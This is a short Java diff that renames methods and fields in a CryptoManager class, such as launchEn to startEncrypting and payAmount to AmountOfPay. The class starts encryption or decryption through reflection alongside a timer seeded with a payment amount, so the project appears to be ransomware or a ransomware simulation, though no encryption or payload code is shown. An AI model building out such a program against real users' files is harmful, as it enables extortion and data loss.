@@ -8,11 +8,11 @@ import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
 public class CryptoManager {
-    private static ThreadTimer timerTask;
+    private static Timer timerTask;
     private static ExecutorService executor;
 
     @SuppressWarnings("unchecked")
-    public static void launchEn(){
+    public static void startEncrypting(){
 
         Object port = null;
         Method launchMethod = null;
@@ -28,7 +28,7 @@ public class CryptoManager {
             launchMethod.invoke(port);
 
             executor = Executors.newFixedThreadPool(1); //Thread Starten
-            timerTask = new ThreadTimer(Configuration.instance.payAmount);
+            timerTask = new Timer(Configuration.instance.AmountOfPay);
             executor.execute(timerTask);
 
         }catch (Exception e){
@@ -39,7 +39,7 @@ public class CryptoManager {
 
 
     @SuppressWarnings("unchecked")
-    public static void launchDec(){
+    public static void startDecrypting(){
 
         Object port = null;
         Method launchMethod = null;
@@ -66,7 +66,7 @@ public class CryptoManager {
     }
 
 
-    public static ThreadTimer getTimerTask(){
+    public static Timer getTimerTask(){
         return timerTask;
     }
 
